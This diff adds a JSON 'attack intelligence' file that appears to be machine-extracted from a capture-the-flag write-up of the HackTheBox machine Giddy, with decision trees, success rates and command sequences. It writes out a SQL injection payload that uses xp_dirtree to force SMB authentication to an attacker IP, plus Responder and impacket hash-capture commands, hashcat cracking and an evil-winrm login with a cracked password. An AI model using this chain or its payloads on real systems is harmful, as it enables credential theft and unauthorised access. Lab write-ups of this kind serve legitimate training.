@@ -1,0 +1,905 @@
+{
+  "writeup_id": "Htb_Giddy",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_iis_sql_injection_to_netntlm",
+    "primary_services": [
+      "http",
+      "https",
+      "winrm",
+      "rdp"
+    ],
+    "port_signature": "80+443+3389+5985",
+    "service_combination": "iis+winrm+rdp",
+    "os_family": "windows_server",
+    "environment_type": "standalone_windows",
+    "entry_vector": "sql_injection_smb_relay",
+    "privilege_path": "web_sqli_to_user_shell",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "mssql_xp_dirtree_available",
+      "stacked_queries_enabled",
+      "powershell_web_access",
+      "net_ntlmv2_capture"
+    ],
+    "environmental_clues": [
+      "iis_10_server",
+      "mvc_application",
+      "windows_2016_server",
+      "powershell_web_access_configured"
+    ],
+    "similar_scenarios": [
+      "jeeves_htb_medium",
+      "bounty_htb_easy"
+    ],
+    "unique_aspects": [
+      "ubiquiti_unifi_video_privesc",
+      "powershell_web_console_access",
+      "smb_authentication_relay"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "SQL_Injection_to_SMB_Relay",
+        "success_reason": "MSSQL server allowed xp_dirtree execution to force SMB authentication",
+        "prerequisite_indicators": [
+          "mssql_backend_detected",
+          "stacked_queries_supported",
+          "xp_dirtree_available",
+          "smb_client_functionality_enabled"
+        ],
+        "recognition_patterns": [
+          "SQL error messages in web responses",
+          "MSSQL-specific error syntax",
+          "Windows/IIS hosting environment",
+          "ASP.NET application stack"
+        ],
+        "failure_modes": [
+          "xp_dirtree_disabled",
+          "smb_client_blocked_by_firewall",
+          "stacked_queries_not_supported",
+          "insufficient_database_privileges"
+        ],
+        "environmental_factors": [
+          "default_mssql_configuration",
+          "windows_smb_auto_authentication",
+          "no_network_segmentation",
+          "legacy_application_design"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-30 minutes"
+      },
+      {
+        "technique": "Net_NTLM_Hash_Cracking",
+        "success_reason": "Service account used weak password susceptible to dictionary attack",
+        "prerequisite_indicators": [
+          "net_ntlmv2_hash_captured",
+          "user_account_identified",
+          "hash_format_valid_for_cracking"
+        ],
+        "recognition_patterns": [
+          "SMB authentication attempts in logs",
+          "Net-NTLMv2 hash format",
+          "Domain\\Username format in hash",
+          "Service account naming patterns"
+        ],
+        "failure_modes": [
+          "strong_password_policy_enforced",
+          "account_uses_complex_password",
+          "hash_capture_incomplete"
+        ],
+        "environmental_factors": [
+          "weak_password_policies",
+          "service_account_password_reuse",
+          "insufficient_security_awareness"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "5 minutes to several hours"
+      },
+      {
+        "technique": "PowerShell_Web_Access_Login",
+        "success_reason": "Captured credentials valid for PowerShell Web Access service",
+        "prerequisite_indicators": [
+          "powershell_web_access_enabled",
+          "valid_domain_credentials_obtained",
+          "service_accessible_remotely"
+        ],
+        "recognition_patterns": [
+          "PowerShell Web Access login page",
+          "SSL certificate mentions PowerShell",
+          "Port 443 with specific login interface",
+          "Windows Server 2016 environment"
+        ],
+        "failure_modes": [
+          "account_not_authorized_for_pswa",
+          "service_disabled_or_restricted",
+          "additional_authentication_required"
+        ],
+        "environmental_factors": [
+          "powershell_web_access_configured",
+          "permissive_access_controls",
+          "remote_management_enabled"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "2-5 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "SQL injection in Product.aspx",
+        "discovery_method": "Manual testing with single quote injection",
+        "why_critical": "Enabled forced SMB authentication and credential capture",
+        "how_to_recognize": [
+          "SQL error messages on quote injection",
+          "ASP.NET/MSSQL technology stack",
+          "Parameter-based injection points",
+          "Stacked query support indicators"
+        ],
+        "follow_up_actions": [
+          "test_xp_dirtree_execution",
+          "setup_smb_listener",
+          "capture_net_ntlm_hashes",
+          "attempt_hash_cracking"
+        ]
+      },
+      {
+        "discovery": "Stacy domain account credentials",
+        "discovery_method": "Net-NTLM hash capture and cracking",
+        "why_critical": "Provided authenticated access to multiple services",
+        "how_to_recognize": [
+          "Net-NTLMv2 hash format in SMB logs",
+          "Domain\\Username authentication attempts",
+          "Successful hash cracking results",
+          "Service account naming patterns"
+        ],
+        "follow_up_actions": [
+          "test_winrm_access",
+          "try_powershell_web_access",
+          "enumerate_additional_services",
+          "check_privilege_escalation_paths"
+        ]
+      },
+      {
+        "discovery": "PowerShell Web Access service",
+        "discovery_method": "Directory enumeration and SSL certificate analysis",
+        "why_critical": "Provided direct shell access with valid credentials",
+        "how_to_recognize": [
+          "SSL certificate commonName references PowerShell",
+          "/remote endpoint with login interface",
+          "Windows PowerShell Web Access branding",
+          "Port 443 with specific authentication form"
+        ],
+        "follow_up_actions": [
+          "attempt_credential_login",
+          "establish_powershell_session",
+          "enumerate_local_privileges",
+          "search_for_privilege_escalation"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "domain_user",
+        "escalation_method": "Ubiquiti_UniFi_Video_Vulnerability",
+        "why_possible": "Vulnerable service running with elevated privileges",
+        "recognition_signs": [
+          "ubiquiti_unifi_video_service_running",
+          "service_running_as_system",
+          "known_vulnerability_present",
+          "service_accessible_to_user"
+        ],
+        "exploitation_path": "Service Exploitation → SYSTEM privileges"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 80,443,3389,5985 open on Windows host",
+        "decision": "Enumerate web services first, then check for PowerShell Web Access",
+        "reasoning": "Web services often have more attack surface than RDP/WinRM without credentials",
+        "confidence": 0.85,
+        "alternatives": [
+          {
+            "option": "rdp_enumeration",
+            "when": "if web enumeration fails"
+          },
+          {
+            "option": "winrm_bruteforce",
+            "when": "if credentials obtained"
+          }
+        ],
+        "success_indicators": [
+          "web_directories_found",
+          "application_endpoints_discovered",
+          "powershell_web_access_identified"
+        ],
+        "next_decision": "analyze_web_application_attack_surface"
+      },
+      {
+        "step": 2,
+        "situation": "Found /mvc web application with product search functionality",
+        "decision": "Test for SQL injection in search and product parameters",
+        "reasoning": "Dynamic content with parameters commonly vulnerable to SQLi",
+        "confidence": 0.9,
+        "prerequisites": [
+          "web_application_identified",
+          "dynamic_parameters_found"
+        ],
+        "success_indicators": [
+          "sql_error_messages",
+          "application_crashes",
+          "response_time_delays"
+        ],
+        "failure_fallbacks": [
+          "directory_traversal",
+          "file_upload_testing",
+          "authentication_bypass"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Confirmed SQL injection in MSSQL database",
+        "decision": "Use xp_dirtree to capture Net-NTLM hashes instead of data extraction",
+        "reasoning": "Net-NTLM capture often more valuable than database data for Windows targets",
+        "confidence": 0.95,
+        "prerequisites": [
+          "mssql_injection_confirmed",
+          "stacked_queries_possible"
+        ],
+        "success_indicators": [
+          "smb_connection_received",
+          "ntlm_hash_captured"
+        ],
+        "failure_fallbacks": [
+          "sqlmap_data_extraction",
+          "xp_cmdshell_attempts",
+          "file_read_operations"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Captured Net-NTLM hash for user Stacy",
+        "decision": "Crack hash with hashcat and test credentials on WinRM/PowerShell Web Access",
+        "reasoning": "WinRM and PowerShell Web Access provide direct shell access",
+        "confidence": 0.85,
+        "prerequisites": [
+          "ntlm_hash_captured",
+          "winrm_service_available"
+        ],
+        "success_indicators": [
+          "password_cracked",
+          "winrm_authentication_successful"
+        ],
+        "failure_fallbacks": [
+          "password_spraying",
+          "smb_enumeration",
+          "rdp_attempts"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_sqli_found": {
+        "action": "prioritize_ntlm_capture_over_data_extraction",
+        "tools": [
+          "responder",
+          "impacket-smbserver"
+        ],
+        "next_phase": "credential_cracking"
+      },
+      "if_ntlm_captured": {
+        "action": "crack_and_test_authentication",
+        "alternatives": [
+          "hashcat",
+          "john"
+        ],
+        "decision_criteria": "test_on_all_available_services"
+      },
+      "if_credentials_valid": {
+        "action": "establish_shell_access",
+        "tools": [
+          "evil-winrm",
+          "powershell_web_access"
+        ],
+        "next_phase": "privilege_escalation_enumeration"
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "prioritize_ntlm_capture_on_mssql_injection",
+        "reasoning": "more_valuable_than_database_data_on_windows_targets",
+        "applicability": "windows_hosts_with_mssql_injection"
+      },
+      {
+        "rule": "test_winrm_before_rdp_with_credentials",
+        "reasoning": "winrm_provides_better_shell_access_and_less_logging",
+        "applicability": "windows_targets_with_valid_credentials"
+      },
+      {
+        "rule": "use_xp_dirtree_for_smb_callback_attacks",
+        "reasoning": "reliable_method_for_ntlm_hash_capture_via_sqli",
+        "applicability": "mssql_injection_with_stacked_queries"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "SQL Injection to SMB Relay",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https",
+          "mssql"
+        ],
+        "required_ports": [
+          80,
+          443,
+          1433
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_application_with_database",
+          "mssql_backend_database",
+          "stacked_queries_enabled",
+          "xp_dirtree_available"
+        ],
+        "success_indicators": [
+          "sql_error_messages_visible",
+          "mssql_error_patterns",
+          "smb_connection_received",
+          "net_ntlmv2_hash_captured"
+        ],
+        "incompatible_with": [
+          "mysql_backend",
+          "postgresql_backend",
+          "waf_blocking_stacked_queries",
+          "xp_cmdshell_disabled_and_no_alternatives"
+        ],
+        "confidence_boosters": [
+          "aspx_file_extensions",
+          "iis_web_server",
+          "windows_server_detected",
+          "database_error_stack_traces"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "PowerShell Web Access Login",
+        "mitre_id": "T1078",
+        "required_services": [
+          "https"
+        ],
+        "required_ports": [
+          443,
+          5985
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "powershell_web_access_enabled",
+          "valid_credentials_obtained",
+          "winrm_service_running"
+        ],
+        "success_indicators": [
+          "powershell_web_access_login_page",
+          "ssl_cert_powershellwebaccesstest",
+          "winrm_port_open",
+          "successful_authentication"
+        ],
+        "incompatible_with": [
+          "powershell_web_access_disabled",
+          "invalid_credentials",
+          "network_isolation"
+        ],
+        "confidence_boosters": [
+          "windows_server_2016",
+          "iis_10_detected",
+          "winrm_service_banner"
+        ],
+        "typical_success_rate": 0.9,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "Directory Bruteforce",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_server_running",
+          "directory_listing_disabled",
+          "common_paths_exist"
+        ],
+        "success_indicators": [
+          "status_200_responses",
+          "status_301_redirects",
+          "status_302_redirects",
+          "interesting_paths_found"
+        ],
+        "incompatible_with": [
+          "waf_blocking_requests",
+          "rate_limiting_aggressive",
+          "all_paths_return_404"
+        ],
+        "confidence_boosters": [
+          "iis_web_server",
+          "aspx_technology_stack",
+          "windows_server_environment"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "5-15 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "windows_iis": {
+        "port_indicators": [
+          80,
+          443,
+          3389,
+          5985
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "ms-wbt-server",
+          "wsman"
+        ],
+        "banner_indicators": [
+          "Microsoft-IIS",
+          "Windows Server",
+          "PowerShellWebAccess"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "mssql_backend": {
+        "port_indicators": [
+          1433
+        ],
+        "service_indicators": [
+          "ms-sql-s"
+        ],
+        "error_indicators": [
+          "System.Data.SqlClient",
+          "Microsoft SQL Server",
+          "Unclosed quotation mark"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "aspx",
+          "mvc",
+          "iis"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "quick_reconnaissance_high_value_paths"
+        },
+        {
+          "attack": "sql_injection_testing",
+          "when": "web_application_with_parameters",
+          "reason": "high_impact_vulnerability_common_in_legacy_apps"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "smb_relay_via_sqli",
+          "when": "mssql_injection_confirmed",
+          "reason": "reliable_credential_harvesting_method"
+        },
+        {
+          "attack": "powershell_web_access_login",
+          "when": "credentials_obtained_and_pswa_detected",
+          "reason": "direct_shell_access_high_success_rate"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "SQL Injection to SMB Relay",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "sqlmap",
+            "command_template": "sqlmap -r {request_file} --dbms mssql --risk 3 --level 5 --batch --dbs",
+            "actual_command": "sqlmap -r product.request --dbms mssql --risk 3 --level 5 --batch --dbs",
+            "effectiveness_rating": 3,
+            "reliability": 0.85
+          },
+          {
+            "name": "manual_sqli",
+            "command_template": "https://{target}/mvc/Product.aspx?ProductSubCategoryId=8;%20EXEC%20master..xp_dirtree%20%22\\\\{attacker_ip}\\{share}%22;%20--",
+            "actual_command": "https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=8;%20EXEC%20master..xp_dirtree%20%22\\\\10.10.14.5\\test%22;%20--",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "mssql_backend",
+          "stacked_queries_enabled",
+          "xp_dirtree_available"
+        ],
+        "success_indicators": [
+          "smb_connection_received",
+          "ntlmv2_hash_captured",
+          "application_error_on_injection"
+        ],
+        "common_failures": [
+          "xp_dirtree_disabled",
+          "network_isolation",
+          "waf_blocking_requests"
+        ],
+        "follow_up_techniques": [
+          "ntlmv2_cracking",
+          "credential_validation",
+          "winrm_authentication"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Net-NTLMv2 Hash Capture",
+        "mitre_id": "T1557.001",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "impacket-smbserver",
+            "command_template": "impacket-smbserver {share_name} .",
+            "actual_command": "impacket-smbserver test .",
+            "output_pattern": "Stacy::GIDDY:*:*:*",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "responder",
+            "command_template": "responder -I {interface}",
+            "actual_command": "responder -I tun0",
+            "output_pattern": "[SMBv2] NTLMv2-SSP Hash",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          }
+        ],
+        "prerequisites": [
+          "network_connectivity_to_target",
+          "smb_outbound_allowed",
+          "target_attempts_authentication"
+        ],
+        "success_indicators": [
+          "ntlmv2_hash_captured",
+          "username_identified",
+          "domain_name_identified"
+        ],
+        "common_failures": [
+          "smb_blocked_by_firewall",
+          "no_outbound_connectivity",
+          "authentication_not_triggered"
+        ],
+        "follow_up_techniques": [
+          "hashcat_cracking",
+          "credential_validation"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "NTLMv2 Hash Cracking",
+        "mitre_id": "T1110.002",
+        "category": "credential_access",
+        "phase": "credential_access",
+        "tools_used": [
+          {
+            "name": "hashcat",
+            "command_template": "hashcat -m 5600 {hash_file} {wordlist} -o {output_file} --force",
+            "actual_command": "hashcat -m 5600 stacy.ntlmv2.hash /usr/share/wordlists/rockyou.txt -o stacy.ntlmv2.cracked --force",
+            "success_factors": [
+              "weak_password",
+              "common_wordlist_hit"
+            ],
+            "effectiveness_rating": 4,
+            "reliability": 0.75
+          }
+        ],
+        "prerequisites": [
+          "captured_ntlmv2_hash",
+          "appropriate_wordlist",
+          "sufficient_compute_power"
+        ],
+        "success_indicators": [
+          "password_cracked_successfully",
+          "plaintext_credentials_obtained"
+        ],
+        "common_failures": [
+          "strong_password_policy",
+          "password_not_in_wordlist",
+          "insufficient_compute_time"
+        ],
+        "follow_up_techniques": [
+          "winrm_authentication",
+          "powershell_web_access",
+          "credential_spraying"
+        ],
+        "time_investment": "1 minute to several hours",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "WinRM Authentication",
+        "mitre_id": "T1021.006",
+        "category": "lateral_movement",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "ruby_winrm_shell",
+            "command_template": "ruby winrm_shell.rb",
+            "actual_command": "Modified Alamot's Ruby winrm shell with credentials",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "evil-winrm",
+            "command_template": "evil-winrm -i {target_ip} -u {username} -p {password}",
+            "actual_command": "evil-winrm -i 10.10.10.104 -u stacy -p xNnWo6272k7x",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "valid_credentials",
+          "winrm_service_enabled",
+          "user_in_remote_management_group"
+        ],
+        "success_indicators": [
+          "successful_authentication",
+          "remote_shell_obtained",
+          "command_execution_possible"
+        ],
+        "common_failures": [
+          "winrm_service_disabled",
+          "user_lacks_permissions",
+          "network_connectivity_issues"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "system_enumeration",
+          "persistence_mechanisms"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "impacket-smbserver",
+        "use_case": "ntlmv2_hash_capture",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "smb_relay_attacks",
+          "hash_capture"
+        ],
+        "alternatives": [
+          "responder",
+          "metasploit_auxiliary"
+        ],
+        "best_practices": [
+          "ensure_share_name_matches_request",
+          "run_from_writable_directory",
+          "monitor_for_multiple_authentication_attempts"
+        ]
+      },
+      {
+        "tool": "responder",
+        "use_case": "network_credential_capture",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "ntlm_relay",
+          "credential_harvesting"
+        ],
+        "alternatives": [
+          "impacket-smbserver",
+          "inveigh"
+        ],
+        "best_practices": [
+          "use_correct_network_interface",
+          "monitor_all_protocols",
+          "save_captured_hashes_immediately"
+        ]
+      },
+      {
+        "tool": "hashcat",
+        "use_case": "ntlmv2_hash_cracking",
+        "effectiveness_rating": 4,
+        "reliability": 0.75,
+        "learning_curve": "medium",
+        "essential_for": [
+          "password_recovery",
+          "credential_attacks"
+        ],
+        "alternatives": [
+          "john_the_ripper",
+          "rainbow_tables"
+        ],
+        "best_practices": [
+          "use_appropriate_hash_mode",
+          "start_with_common_wordlists",
+          "consider_rule_based_attacks"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "sqli_to_ntlmv2_capture",
+        "steps": [
+          {
+            "step": 1,
+            "command": "impacket-smbserver test .",
+            "purpose": "Start SMB server to capture authentication",
+            "expected_output": "SMB server listening"
+          },
+          {
+            "step": 2,
+            "command": "curl 'https://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=8;%20EXEC%20master..xp_dirtree%20%22\\\\10.10.14.5\\test%22;%20--'",
+            "purpose": "Trigger SMB connection via SQL injection",
+            "expected_output": "SMB connection received with NTLMv2 hash"
+          },
+          {
+            "step": 3,
+            "command": "hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt",
+            "purpose": "Crack captured NTLMv2 hash",
+            "expected_output": "Password: xNnWo6272k7x"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "15-30 minutes"
+      },
+      {
+        "sequence_name": "credential_validation_to_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "evil-winrm -i 10.10.10.104 -u stacy -p xNnWo6272k7x",
+            "purpose": "Authenticate via WinRM",
+            "expected_output": "Remote PowerShell session"
+          },
+          {
+            "step": 2,
+            "command": "whoami",
+            "purpose": "Confirm user context",
+            "expected_output": "giddy\\stacy"
+          }
+        ],
+        "success_rate": 0.95,
+        "typical_duration": "2-5 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Giddy",
+      "difficulty": "Medium",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2018-09-08",
+      "author": "lkys37en",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "sql_injection",
+        "smb_relay",
+        "service_exploitation"
+      ],
+      "key_vulnerabilities": [
+        "sql_injection",
+        "net_ntlmv2_capture",
+        "ubiquiti_unifi_video_vulnerability"
+      ],
+      "environment_type": "windows_web_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "sql_injection_to_smb",
+        "ntlm_hash_cracking",
+        "service_privilege_escalation"
+      ],
+      "prerequisite_knowledge": [
+        "sql_injection",
+        "smb_protocol",
+        "windows_services"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "sql_injection",
+        "credential_harvesting",
+        "service_exploitation"
+      ],
+      "attack_types": [
+        "injection",
+        "credential_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "service_hardening",
+        "network_segmentation"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Jeeves",
+        "Bounty",
+        "Optimum"
+      ],
+      "similarity_reasons": [
+        "windows_web_server",
+        "service_exploitation",
+        "credential_harvesting"
+      ],
+      "unique_aspects": [
+        "sql_injection_to_smb_relay",
+        "powershell_web_access",
+        "ubiquiti_unifi_vulnerability"
+      ],
+      "difficulty_factors": [
+        "multi_stage_attack_chain",
+        "hash_cracking_required",
+        "service_specific_exploit"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T01:14:23.836737",
+    "original_file": "0xdf_writeups/Htb Giddy.md",
+    "content_length": 28629,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
